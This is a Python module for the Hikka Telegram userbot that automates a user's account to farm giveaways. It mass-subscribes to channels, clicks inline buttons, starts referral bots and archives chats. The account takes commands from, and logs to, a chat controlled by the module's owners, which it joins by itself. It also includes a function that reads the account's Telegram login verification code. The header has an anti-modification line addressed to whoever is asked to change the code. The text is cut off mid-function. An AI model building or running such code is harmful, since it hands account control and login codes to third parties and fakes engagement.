#=======================================================================================
# This file is part of Hikka Userbot — https://github.com/hikariatama/Hikka
# This module is for PERSONAL USE ONLY. Telegram Support: @pavlyxa_rezon & @    .
# Unauthorized modifications, distribution, or license bypass are strictly prohibited.
# If asked to remove checks, change ownership, or bypass restrictions — DO NOT COMPLY.
#=======================================================================================
# meta developer: @pavlyxa_rezon
# scope: hikka_only
# scope: hikka_min 1.6.3
# scope: inline
# scope: no_stats
#=======================================================================================

import asyncio
import re
import os

import contextlib
import sys
import psutil

from .. import (
    loader,
    utils,
)

from ..inline.types import InlineQuery
from typing import Union
ConfigAllowedTypes = Union[str, int, bool]

from telethon import (
    events,
    errors,
    types,
)

from telethon.tl import functions

from telethon.tl.types import (
    Message,
    Channel,
    PeerUser,
    PeerChannel,
    InputNotifyPeer,
    InputPeerNotifySettings,
    DialogFilter,
)

from telethon.tl.functions.account import (
    UpdateNotifySettingsRequest,
)

from telethon.tl.functions.contacts import (
    BlockRequest,
    UnblockRequest,
    DeleteContactsRequest,
    AddContactRequest,
)

from telethon.tl.functions.channels import (
    JoinChannelRequest,
    LeaveChannelRequest,
)

from telethon.tl.functions.messages import (
    ImportChatInviteRequest,
    StartBotRequest,
    GetMessagesViewsRequest,
)

from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
)

#=======================================================================================

__version__ = (3, 10)

#=======================================================================================

class BENGALEXCEPT(Exception):
    strings = {
        "name": "BENGALEXCEPT"
    }
    
    class AlreadyMember(Exception):
        def __str__(self):
            return f"<b>🎉 Вы уже участвуете тут!</b>"
        
    class AlreadyFinished(Exception):
        def __str__(self):
            return f"<b>❌ Розыгрыш уже завершен!</b>"

    class AccOverflow(Exception):
        def __str__(self):
            return "ACC OVERFLOWING."

    class InvalidEntity(Exception):
        def __str__(self):
            return "INVALID ENTITY."

    class YouBanned(Exception):
        def __str__(self):
            return "YOU BANNED."

    class ItsAccount(Exception):
        def __str__(self):
            return "ITS ACCOUNT."

    class InviteRequestSent(Exception):
        def __str__(self):
            return "INV REQUEST SENT ♻️"

    class AlreadyThere(Exception):
        def __str__(self):
            return "ALREADY THERE."

    class NoMember(Exception):
        def __str__(self):
            return "NO MEMBER."

    class FormatError(Exception):
        def __str__(self):
            return "TARGET FORMAT."

    class ClickFail(Exception):
        def __str__(self):
            return "BUTTON RIP."

    class NoButton(Exception):
        def __str__(self):
            return "NO BUTTON."

    class ItsUrlButton(Exception):
        def __str__(self):
            return "ITS URL (REF)."

    class FloodWait(Exception):
        def __str__(self):
            return "FLOOD WAIT."

#=======================================================================================

    @staticmethod
    def bengal_exceptor(e):
        error_msg = str(e)
        if "You have joined too many channels/supergroups" in error_msg:
            raise BENGALEXCEPT.AccOverflow()
        elif "Cannot cast InputPeerUser to any kind of InputChannel." in error_msg:
            raise BENGALEXCEPT.ItsAccount()
        elif "Another reason may be that you were banned from it" in error_msg:
            raise BENGALEXCEPT.YouBanned()
        elif any(substring in error_msg for substring in [
            "No user has",
            "Invalid username",
            "INVALID ENTITY.",
            "Nobody is using this username, or the username is unacceptable",
            "Cannot find any entity corresponding",
            "The chat the user tried to join has expired and is not valid anymore"
        ]):
            raise BENGALEXCEPT.InvalidEntity()
        elif any(substring in error_msg for substring in [
            "RPCError 400: INVITE_REQUEST_SENT (caused by ImportChatInviteRequest)",
            "You have successfully requested to join this chat or channel"
        ]):
            raise BENGALEXCEPT.InviteRequestSent()
        elif "The authenticated user is already a participant of the chat" in error_msg:
            raise BENGALEXCEPT.AlreadyThere()
        elif any(substring in error_msg for substring in [
            "The target user is not a member of the specified megagroup or channel",
            "Could not find the input entity for PeerChannel",
            "The channel specified is private and you lack permission to access it"
        ]):
            raise BENGALEXCEPT.NoMember()
        elif any(substring in error_msg for substring in [
            "not enough values to unpack",
            "Cannot get entity from a channel (or group) that you are not part of. Join the group and retry"
        ]):
            raise BENGALEXCEPT.FormatError()
        elif "'NoneType' object has no attribute" in error_msg:
            raise BENGALEXCEPT.ClickFail()
        elif "no button" in error_msg:
            raise BENGALEXCEPT.NoButton()
        elif "'KeyboardButtonUrl' object has no attribute 'data'" in error_msg:
            raise BENGALEXCEPT.ItsUrlButton()
        elif "A wait of" in error_msg and "is required" in error_msg:
            raise BENGALEXCEPT.FloodWait()
        else:
            raise Exception(f"{error_msg}")
        
#=======================================================================================

@loader.tds
class BENGALSOFT(loader.Module):
    strings = {
        "name": "BENGALSOFT",
        "license_warning": "Read the license terms and conditions",

        "waiting": "<b>⏳ Ща все будет...</b>",
        "already_member": "<b>🎉 Вы уже участвуете тут!</b>",
        "success_participate": "<b>🎉 Участие зачтено!</b>",

        "already_finished": "<b>❌ Розыгрыш уже завершен!</b>",
        "no_sponsors": "<b>❌ Подпишитесь на каналы!</b>",

        "success_captcha": "<b>🎉 Капча развязана!</b>",
        "wrong_captcha": "<b>🚫 Капча решена неверно.</b>",
        
        "bot_deleted": "<b>🚫 Бот удален из канала.</b>",
        "none_params": "<b>❌ Бот запущен без параметров!</b>",
        "unknown_response": "<b>🚫 Неизвестный ответ бота.</b>",

        "click_failed": "<b>⚠️ Кнопка не ответила.</b>",
        "no_buttons": "<b>🚫 Кнопок вообще нету.</b>",
        "no_button": "<b>🚫 Нету кнопки участия.</b>",

        "not_started": "<b>⚠️ Розыгрыш еще не запущен.</b>",
    }

    strings_ua = {
        "waiting": "<b>⏳ Зараз все буде...</b>",
    }


#=======================================================================================
    
    def __init__(self):
        self.softname = "ANSTLER"
        self.softversion = ".".join(map(str, __version__))
        self.license_number = 7

        self.settings_list = [
            "https://t.me/c/2166882487/20554",
        ]

        self.owner_user = "@anstler"
        self.owner_list = [
            888965441, #@anstler 
            922318957, #@pavlyxa_rezon
        ]

        self.owner_chat = -1002166882487
        self.owner_link = "t.me/+bGWkEgWIggZkN2Qy"

        self.whitelist_soft = [
            None,
        ]

        self.whitelist_user = [
            None,
        ]

        self.ignorelist = [
            None,
        ]

        self.selector = True
        self.dl_checker = True
        self.cleaner = None
        self.user = None

        self.def_mult = 10

        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "logger",
                False,
                "Статус логера.",
                validator=loader.validators.Boolean(),
            ),
            loader.ConfigValue(
                "group",
                1,
                "Номер пачки.",
                validator=loader.validators.Integer(),
            ),
        )

        self.reactions = {
            "positive": {
                1: ["❤️", "❤️‍🔥", "💘", "🥰", "😍", "😘"],
                2: ["🆒", "🔥", "💯", "⚡️", "🏆", "🎉", "🙏"],
                3: ["🤗", "😁", "🤩", "😇", "😎", "🤣", "😈"],
                4: ["👍", "👏", "🤝", "🫡", "💋", "🍓", "👻"]
            },
            "negative": {
                1: ["💩", "🤮", "🤡", "🤬", "😡", "🖕"],
                2: ["🙊", "🙈", "🙉", "🤷‍♂️", "🤷", "🤷‍♀️"],
                3: ["💅", "🦄", "👾", "👎", "✍️", "🤯"]
            },
            "neutral": {
                1: ["🤔", "🤨", "😐", "🥴", "🥱", "👨‍💻"],
                2: ["🗿", "🤓", "👀", "🐳", "🎃", "🕊"],
                3: ["🌚", "😢", "😭", "😨", "😴", "😱", "💔"],
                4: ["🎅", "🎄", "☃️", "🌭", "🍌", "🍾", "💊"]
            }
        }


#=======================================================================================
#=======================================================================================

    async def delay_host(self, delay_s):
        await asyncio.sleep(delay_s)
    
#=======================================================================================

    def get_delay_host(self, mult=None):
        mult = int(mult) if mult and int(mult) < 500 else self.def_mult
        delay_s = self.config["group"] * mult
        return mult, delay_s

#=======================================================================================

    def get_size(self, bytes):
        factor = 1024
        for unit in ["", "KB", "MB", "GB", "TB"]:
            if bytes < factor:
                return f"{int(bytes)}{unit}"
            bytes /= factor
        return f"{int(bytes)}{unit}"
    
#=======================================================================================

    def user_validator(self, target) -> bool:
        if not self.user:
            return False
        user = self.user
        user_id = str(user.id)
        username = f"@{user.username}" if user.username else ""
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        phone = user.phone
        uphone = f"+{phone}" if phone else ""
        return target in {"all", username, phone, uphone, user_id, first_name, last_name, full_name}

#=======================================================================================

    @staticmethod
    def bool_validator(value) -> bool:
        if isinstance(value, bool):
            return value
        true_values = {"true", "1", "yes", "on", "y"}
        false_values = {"false", "0", "no", "off", "n"}
        value_str = str(value).lower()
        return value_str in true_values if value_str in true_values | false_values else False

#=======================================================================================

    async def close_form(self, call):
        await call.edit("<b>🚫 Форма закрыта.</b>")
        await call.delete()
        return

#=======================================================================================


    async def get_server_info(self):
        keys = [
            "cpu_full", "cpu_load", "ram_usage", "ram_full", "ram_load", "swap_usage",
            "swap_full", "swap_load", "disk_usage", "disk_full", "disk_load", "system", "python"
        ]
        inf = {key: "_" for key in keys}
        with contextlib.suppress(Exception):
            inf["cpu_full"] = psutil.cpu_count(logical=True)
            inf["cpu_load"] = int(psutil.cpu_percent())

            ram = psutil.virtual_memory()
            inf["ram_usage"] = self.get_size(ram.total - ram.available)
            inf["ram_full"] = self.get_size(ram.total)
            inf["ram_load"] = int(ram.percent)

            swap = psutil.swap_memory()
            inf["swap_usage"] = self.get_size(swap.used)
            inf["swap_full"] = self.get_size(swap.total)
            inf["swap_load"] = int(swap.percent)

            disk = psutil.disk_usage('/')
            inf["disk_usage"] = self.get_size(disk.used)
            inf["disk_full"] = self.get_size(disk.total)
            inf["disk_load"] = int(disk.percent)

            system = os.popen("cat /etc/*release").read()
            b = system.find('DISTRIB_DESCRIPTION="') + 21
            system = system[b:system.find('"', b)]
            inf["system"] = utils.escape_html(system)
            inf["python"] = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
        
        text = (
            f"<b>SYSTEM: {inf['system']}\n"
            f"Python Version: {inf['python']}\n\n"
            f"CPU {inf['cpu_load']}% — {inf['cpu_full']} Cores\n"
            f"RAM {inf['ram_load']}% — {inf['ram_usage']} of {inf['ram_full']}\n\n"
            f"DISK {inf['disk_load']}% — {inf['disk_usage']} of {inf['disk_full']}\n"
            f"SWAP {inf['swap_load']}% — {inf['swap_usage']} of {inf['swap_full']}\n</b>"
        )

        return text

#=======================================================================================

    async def get_verif_code(self, mode=None):
        try:
            code_pattern = r'\b\d{5}\b'
            async for message in self.client.iter_messages(PeerUser(777000), limit=1):
                match = re.search(code_pattern, message.text)
                if match:
                    ver_code = match.group(0)
                    for_code = ".".join(ver_code)
                    result = f"<b>♻️ VERIF CODE: </b>{for_code}"
                    if mode is not None:
                        return ver_code, result
                    else:
                        return result
            return "<b>🚫 VERIF CODE: не найден.</b>"
        except Exception as e:
            return f"<b>🚫 VERIF: </b>{e}"
        
#=======================================================================================

    async def get_bot_response(self, bot_name, pos=0):
        try:
            await asyncio.sleep(10)
            messages = await self.client.get_messages(bot_name, limit=2)
            if pos == 1:
                response = messages[1].message if len(messages) > 1 else None
            elif pos == 0:
                response = messages[0].message if messages else None
            elif pos == 2:
                if len(messages) >= 2:
                    response = (messages[0].message, messages[1].message)
                else:
                    response = None
            if not response or response == "/start":
                return "⚠️ Ошибка, бот не ответил."
            return response
        except Exception as e:
            return f"<b>🚫 LASTMESS: </b>{e}"
        
#=======================================================================================
#=======================================================================================


    async def send_logger_message(self, text, delay_info=None):
        try:
            if not self.config["logger"]:
                return
            if delay_info is None:
                logger_message = text
            else:
                mult, delay_s = delay_info
                delay_text = f", M: x{mult}, KD: {delay_s} sec."
                logger_message = f"💻 <b>PACK: {self.config['group']}{delay_text}</b>\n{text}"
            try:
                await self.client.send_message(
                    entity=self.owner_chat,
                    message=logger_message,
                    link_preview=False
                )
            except Exception as e:
                if "The channel specified is private and you lack permission to access it" in str(e):
                    await self.client(ImportChatInviteRequest(self.owner_link.split('+')[1]))
                    await self.client.send_message(
                        entity=self.owner_chat,
                        message=logger_message,
                        link_preview=False
                    )
                else:
                    return
        except Exception:
            pass

#=======================================================================================

    async def send_custom_message(self, text, recipient=None):
        try:
            if recipient is None:
                recipient = self.owner_chat
            try:
                await self.client.send_message(
                    entity=recipient,
                    message=text,
                    link_preview=False
                )
            except Exception as e:
                if "The channel specified is private and you lack permission to access it" in str(e) and recipient == self.owner_chat:
                    await self.client(ImportChatInviteRequest(self.owner_link.split('+')[1]))
                    await self.client.send_message(
                        entity=recipient,
                        message=text,
                        link_preview=False
                    )
                else:
                    return
        except Exception:
            pass


#=======================================================================================
#=======================================================================================


    async def handle_subscribe(self, message):
        try:
            parts = message.message.split()
            if len(parts) < 2 or not self.get("lic_sub", False):
                return
            mult = int(parts[1]) if parts[1].isdigit() else None
            targetlist = parts[2:] if mult else parts[1:]
            if message.chat_id != self.owner_chat:
                mult, delay_s = 1, 1
            else:
                mult, delay_s = self.get_delay_host(mult)
                await self.delay_host(delay_s)
            counter, success_count, form_logger, text_logger = 0, 0, None, None
            if not targetlist:
                raise Exception("NO TARGET")
            if self.config["logger"]:
                if len(targetlist) > 1:
                    done_message = f"<b>💻 PACK: {self.config['group']}, M: x{mult}, KD: {delay_s} sec.</b>\n"
                    form_logger = await self.inline.form(
                        message=self.owner_chat,
                        text=f"<b>{done_message}⏳ Идет процесс мультиподписок</b>",
                    )
                else:
                    text_logger = ""
            for counter, target in enumerate(targetlist, start=1):
                if 't.me/+' in target or 't.me/joinchat/' in target:
                    iteration = await self.subscribe_private(target)
                elif "t.me/" in target or target.startswith("@"):
                    iteration = await self.subscribe_public(target)
                else:
                    iteration = "<b>🚫 HANDLE SUB: FORMAT.</b>"
                if form_logger:
                    done_message += f"{counter}. {iteration}\n"
                    success_count += 1 if "♻️" in iteration else 0
                    if "FLOOD WAIT" in iteration or "ACC OVERFLOWING" in iteration:
                        done_message += f"<b>⚠️ Процесс прерван на {counter}.\n</b>"
                        break
                    else:
                        await asyncio.sleep(5)
                elif text_logger is not None:
                    text_logger = iteration
            if form_logger:
                await form_logger.edit(f"<b>{done_message}\n💬 Завершено. Успешно {success_count} из {len(targetlist)}.</b>") 
            elif text_logger is not None:
                return await self.send_logger_message(
                    text=text_logger,
                    delay_info = (mult, delay_s)
                )
        except Exception as e:
            if self.config["logger"] and not form_logger:
                return await self.send_logger_message(
                    text=f"<b>🚫 HANDLE SUBSCR:</b> {e}",
                    delay_info = (mult, delay_s)
                )

#=======================================================================================

    async def subscribe_public(self, target):
        try:
            try:
                if target.startswith("@"):
                    chan = target[1:]
                elif "t.me/" in target:
                    chan = target.split("t.me/")[1].split("/")[0]
                else:
                    raise Exception("Invalid username")
                link = f"https://t.me/{chan}"
                await self.client(JoinChannelRequest(channel=chan))
                target_entity = await self.client.get_entity(link)
                view_result = await self.views_post(channel_id=target_entity.id)
                arch_result = await self.archive_chat(target_id=target_entity.id)
                result = f"<b>♻️ SUBSCR <a href='{link}'>PUBLIC</a>, {view_result}-{arch_result}</b>"
            except Exception as e:
                raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>🚫 SUBSCR PB:</b> {str(e)}"
        finally:
            return result
            
#=======================================================================================

    async def subscribe_private(self, target):
        try:
            try:
                if "t.me/+" in target:
                    invite_hash = target.split("t.me/+")[1]
                elif "t.me/joinchat/" in target:
                    invite_hash = target.split("t.me/joinchat/")[1]
                else:
                    raise Exception("Invalid username")
                await self.client(ImportChatInviteRequest(invite_hash))
                target_entity = await self.client.get_entity(target)
                view_result = await self.views_post(channel_id=target_entity.id)
                arch_result = await self.archive_chat(target_id=target_entity.id)
                result = f"<b>♻️ SUBSCR <a href='{target}'>PRIVATE</a>, {view_result}-{arch_result}</b>"
            except Exception as e:
                raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>🚫 SUBSCR PR:</b> {str(e)}"
        finally:
            return result

#=======================================================================================
    
    async def archive_chat(self, target_id):
        try:
            await self.client.edit_folder(target_id, 1)
            return "ARC"
        except Exception as e:
            return f"ARC: {e}"


#=======================================================================================


    async def handle_unsubscribe(self, message):
        try:
            parts = message.message.split()
            if len(parts) < 2 or not self.get("lic_uns", False):
                return
            mult = int(parts[1]) if parts[1].isdigit() else None
            targetlist = parts[2:] if mult else parts[1:]
            if message.chat_id != self.owner_chat:
                mult, delay_s = 1, 1
            else:
                mult, delay_s = self.get_delay_host(mult)
                await self.delay_host(delay_s)
            counter, success_count, form_logger, text_logger = 0, 0, None, None
            if self.config["logger"]:
                if len(targetlist) > 1:
                    done_message = f"<b>💻 PACK: {self.config['group']}, M: x{mult}, KD: {delay_s} sec.</b>\n"
                    form_logger = await self.inline.form(
                        message=self.owner_chat,
                        text=f"<b>{done_message}⏳ Идет процесс мультиотписок</b>",
                    )
                else:
                    text_logger = ""
            for counter, target in enumerate(targetlist, start=1):
                if target.isdigit() or "t.me/c/" in target or 't.me/+' in target:
                    iteration = await self.unsubscribe_id(target)
                elif target.startswith("@") or "t.me/" in target:
                    iteration = await self.unsubscribe_public(target)
                else:
                    iteration = "<b>🚫 HANDLE UNSUBSCR: FORMAT.</b>"
                if form_logger:
                    done_message += f"{counter}. {iteration}\n"
                    success_count += 1 if "♻️" in iteration else 0
                    await asyncio.sleep(5)
                elif text_logger is not None:
                    text_logger = iteration
            if form_logger:
                await form_logger.edit(f"<b>{done_message}\n💬 Завершено. Успешно {success_count} из {len(targetlist)}.</b>")
            elif text_logger is not None:
                return await self.send_logger_message(
                    text=text_logger,
                    delay_info=(mult, delay_s)
                )
        except Exception as e:
            if self.config["logger"] and not form_logger:
                return await self.send_logger_message(
                    text=f"<b>🚫 HANDLE UNSUBSCR:</b> {e}",
                    delay_info=(mult, delay_s)
                )

#=======================================================================================

    async def unsubscribe_public(self, target):
        try:
            try:
                if target.startswith("@"):
                    username = target[1:]
                    link = f"https://t.me/{username}"
                elif "t.me/" in target:
                    chan = target.split("t.me/")[1].split("/")[0]
                    link = f"https://t.me/{chan}"
                    username = chan
                else:
                    raise Exception("Invalid username")
                await self.client.get_entity(username)
                await self.client(LeaveChannelRequest(username))
                result =f"<b>♻️ UNSUBSCRIBE: <a href='{link}'>PUBLIC.</a></b>"
            except Exception as e:
                if "Cannot cast InputPeerUser to any kind of InputChannel" in str(e):
                    await self.client.delete_dialog(username)
                    result = f"<b>♻️ UNSUBSCR: <a href='{link}'>PUBLIC PM</a></b>"
                else:
                    raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>🚫 UNSUB:</b> {str(e)}"
        finally:
            return result

#=======================================================================================

    async def unsubscribe_id(self, target):
        try:
            try:
                if "t.me/c/" in target:
                    try:
                        chan = target.split("t.me/c/")[1].split("/")[0]
                        channel_id = int(chan)
                        link = f"https://t.me/c/{channel_id}"
                    except IndexError:
                        raise BENGALEXCEPT.InvalidEntity()
                elif "t.me/+" in target:
                    target_entity = await self.client.get_entity(target)
                    channel_id = target_entity.id
                    link = f"https://t.me/c/{channel_id}"
                elif target.isdigit():
                    channel_id = int(target)
                    link = f"https://t.me/c/{channel_id}"
                else:
                    raise Exception("Invalid username")
                await self.client(LeaveChannelRequest(channel_id))
                result = f"<b>♻️ UNSUBSCRIBE: <a href='{link}'>PRIVATE.</a></b>"
            except Exception as e:
                if "Cannot cast InputPeerUser to any kind of InputChannel" in str(e):
                    await self.client.delete_dialog(channel_id)
                    result = f"<b>♻️ UNSUBSCR: <a href='{link}'>PRIVATE PM</a></b>"
                else:
                    raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>🚫 UNSUBSCR:</b> {str(e)}"
        finally:
            return result


#=======================================================================================
#=======================================================================================


    async def handle_runner(self, message):
        try:
            parts = message.message.split()
            if len(parts) < 2 or not self.get("lic_run", False):
                return
            mult = int(parts[1]) if parts[1].isdigit() else None
            target = parts[2].strip() if mult else parts[1].strip()
            if message.chat_id != self.owner_chat:
                mult, delay_s = 1, 1
            else:
                mult, delay_s = self.get_delay_host(mult)
                await self.delay_host(delay_s)
            if "t.me/c/" in target:
                done_message = await self.button_private(target)
            elif "t.me/" in target:
                done_message = await self.button_public(target)
            else:
                done_message = "<b>🚫 HANDLE RUN: FORMAT.</b>"
        except Exception as e:
            done_message = f"<b>🚫 HANDLE RUN:</b> {e}"
        finally:
            return await self.send_logger_message(
                done_message,
                delay_info = (mult, delay_s)
            )
            

#=======================================================================================
    
    async def button_private(self, target):
        try:
            try:
                chan, post = target.split("t.me/c/")[1].split("/")
                inline_button = await self.client.get_messages(
                    PeerChannel(int(chan)),
                    ids=int(post)
                )
                if not inline_button or not hasattr(inline_button, 'reply_markup') or not inline_button.reply_markup:
                    raise Exception("no button")
                click = await inline_button.click(
                    data=inline_button.reply_markup.rows[0].buttons[0].data
                )
                clicked_message = click.message
                view_result = await self.views_post(
                    channel_id=int(chan),
                    post_id=int(post)
                )
                result = f"<b>♻️ PUSH: <a href='{target}'>PRIVATE INLINE</a>, {view_result}</b>\n\n{clicked_message}"
            except Exception as e:
                raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>🚫 PUSH PRIV: </b>{e}"
        finally:
            return result
                
#=======================================================================================

    async def button_public(self, target):
        try:
            try:
                chan, post = target.split("t.me/")[1].split("/")
                channel_entity = await self.client.get_entity(chan)
                inline_button = await self.client.get_messages(
                    chan,
                    ids=int(post)
                )
                if not inline_button or not hasattr(inline_button, 'reply_markup') or not inline_button.reply_markup:
                    raise Exception("no button")
                click = await inline_button.click(
                    data=inline_button.reply_markup.rows[0].buttons[0].data
                )
                clicked_message = click.message
                view_result = await self.views_post(
                    channel_id=channel_entity.id,
                    post_id=int(post)
                )
                result = f"<b>♻️ PUSH: <a href='{target}'>PUBLIC INLINE</a>, {view_result}</b>\n\n{clicked_message}"
            except Exception as e:
                raise BENGALEXCEPT.bengal_exceptor(e)
        except Exception as e:
            result = f"<b>🚫 PUSH PUBL: </b>{e}"
        finally:
            return result
                
    
#=======================================================================================
#=======================================================================================


    async def handle_referal(self, message):
        try:
            parts = message.message.split()
            if len(parts) < 2 or not self.get("lic_ref", False):
                return
            mult = int(parts[1]) if parts[1].isdigit() else None
            target = parts[2].strip() if mult else parts[1].strip()
            if message.chat_id != self.owner_chat:
                mult, delay_s = 1, 1
            else:
                mult, delay_s = self.get_delay_host(mult)
                await self.delay_host(delay_s)
            if "t.me/" in target and not "?start=" in target:
                try:
                    if "t.me/c/" in target:
                        chan, post = target.split("t.me/c/")[1].split("/")
                        message = await self.client.get_messages(
                            PeerChannel(int(chan)),
                            ids=int(post)
                        )
                    else:
                        chan, post = target.split("t.me/")[1].split("/")
                        message = await self.client.get_messages(
                            chan,
                            ids=int(post)
                        )
                    if not message or not hasattr(message, 'reply_markup') or not message.reply_markup:
                        raise Exception("NO BUTTON")
                    ref_link = None
                    for row in message.reply_markup.rows:
                        for button in row.buttons:
                            if hasattr(button, 'url') and "?start=" in button.url:
                                ref_link = button.url
                                break
                        if ref_link:
                            break
                    if not ref_link:
                        raise Exception("no ref link in buttons")
                    target = ref_link
                except Exception as e:
                    raise BENGALEXCEPT.bengal_exceptor(str(e))
            sup_bot = {
                "BestRandom_bot": self.start_bestrandom_bot,
                "best_contests_bot": self.start_bestcontests_bot,
                "TicketsBot": self.start_tickets_bot,
                "TheFastes_Bot": self.start_thefastes_bot,
                "TheFastesRuBot": self.start_thefastesrubot,
                "GiveawayLuckyBot": self.start_ref_bot
            }
            bot_name = next((bot for bot in sup_bot.keys() if bot in target), None)
            match = re.search(r"\?start=([\w-]+)", target)
            ref_key = match[1] if match else None
            if not bot_name or not ref_key:
                done_message = f"<b>🚫 HANDLE REF:</b> target"
            else:
                done_message = await sup_bot[bot_name](bot_name, ref_key)
        except Exception as e:
            done_message = f"<b>🚫 HANDLE REF:</b> {e}"
        finally:
            return await self.send_logger_message(
                done_message,
                delay_info = (mult, delay_s)
            )

#=======================================================================================
    
    async def start_ref_bot(self, bot_name, ref_key):
        try:
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "⚠️ Ошибка, бот не ответил.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
            return f"<b>♻️ START BOT: <a href='https://t.me/{bot_name}?start={ref_key}'>REFERAL KEY.</a></b>\n{response}"
        except Exception as e:
            return f"<b>🚫 START:</b> @{bot_name}\n{e}"
            
#=======================================================================================
    
    async def start_bestrandom_bot(self, bot_name, ref_key):
        try:
            await self.client.send_message(
                bot_name,
                "/cancel"
            )
            await self.delay_host(2)
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "⚠️ Ошибка, бот не ответил.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
                if response == "⚠️ Ошибка, бот не ответил.":
                    return response
            answer = "🚫 Неизвестный ответ бота. "
            if response.startswith("🎉 Теперь вы участник конкурса"):
                view = await self.views_referal_post(bot_name)
                answer = f"{self.strings('success_participate')} {view}"
            elif response.startswith("❌ Вы уже участвуете"):
                answer = self.strings('already_member')
            elif response.startswith("❌ Вы не подписаны"):
                answer = self.strings('no_sponsors')
            elif response.startswith("❌ Конкурс уже завершен!"):
                answer = self.strings('already_finished')
            elif response.startswith("▶️ Какие числа вы видите"):
                answer = f"<b>🚫 Модуль рекапчи:</b>  NONE"
            elif response.startswith("Привет! 😉"):
                answer = self.strings('none_params')
            elif response.startswith("❌ Не удается проверить подписку"):
                answer = self.strings('bot_deleted')
            else:
                answer += f"{response}"
            return f"<b>♻️ START: <a href='https://t.me/{bot_name}?start={ref_key}'>BESTRANDOMBOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>🚫 START BESTRANDOMBOT:</b> {e}"

#=======================================================================================

    async def start_bestcontests_bot(self, bot_name, ref_key):
        try:
            await self.client.send_message(
                bot_name,
                "/reset"
            )
            await self.delay_host(2)
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "⚠️ Ошибка, бот не ответил.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
                if response == "⚠️ Ошибка, бот не ответил.":
                    return response
            answer = self.strings('unknown_response')
            if response.startswith("✅ Теперь ты участвуешь"):
                answer = self.strings('success_participate')
            elif response.startswith("🚫 Ты уже участвуешь"):
                answer = self.strings('already_member')
            elif response.startswith("🚫 Проверь подписки"):
                answer = self.strings('no_sponsors')
            elif response.startswith("🚫 Этот розыгрыш уже завершён!"):
                answer = self.strings('already_finished')
            elif response.startswith("✍ Введите текст из капчи."):
                answer = f"<b>🚫 Модуль рекапчи:</b>  NONE"
            elif response.startswith("✌️ Привет"):
                answer = self.strings('none_params')
            else:
                answer += f"{response}"
            return f"<b>♻️ START: <a href='https://t.me/{bot_name}?start={ref_key}'>BESTCONTESTSBOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>🚫 START BESTCONTESTSBOT:</b> {e}"
        
#=======================================================================================

    async def start_tickets_bot(self, bot_name, ref_key):
        try:
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(
                bot_name,
                pos=1
            )
            if response == "⚠️ Ошибка, бот не ответил.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(
                    bot_name,
                    pos=1
                )
                if response == "⚠️ Ошибка, бот не ответил.":
                    return response
            answer = self.strings('unknown_response')
            if response.startswith("✅ Вы участвуете в розыгрыше!"):
                answer = self.strings('success_participate')
            elif response.startswith("🔄 Вы уже участвуете!"):
                answer = self.strings('already_member')
            elif response.startswith("ℹ️ Для участия в розыгрыше необходимо подписаться"):
                answer = self.strings('no_sponsors')
            return f"<b>♻️ START: <a href='https://t.me/{bot_name}?start={ref_key}'>TICKETSBOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>🚫 START:</b> {e}"
        
#=======================================================================================
    
    async def start_thefastes_bot(self, bot_name, ref_key):
        try:
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "⚠️ Ошибка, бот не ответил.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
                if response == "⚠️ Ошибка, бот не ответил.":
                    return response
            answer = self.strings('unknown_response')
            if response.startswith("✅ Отлично, вы приняли участие"):
                answer = self.strings('success_participate')
            elif response.startswith("❗️ Вы уже приняли участие в"):
                answer = self.strings('already_member')
            elif response.startswith("❌ Реферальный конкурс уже завершён!"):
                answer = self.strings('already_finished')
            elif "Для участия нужно подписаться" in response:
                answer = self.strings('no_sponsors')
            return f"<b>♻️ START: <a href='https://t.me/{bot_name}?start={ref_key}'>THEFASTES BOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>🚫 START:</b> {e}"

#=======================================================================================

    async def start_thefastesrubot(self, bot_name, ref_key):
        try:
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "⚠️ Ошибка, бот не ответил.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
                if response == "⚠️ Ошибка, бот не ответил.":
                    return response
            answer = self.strings('unknown_response')
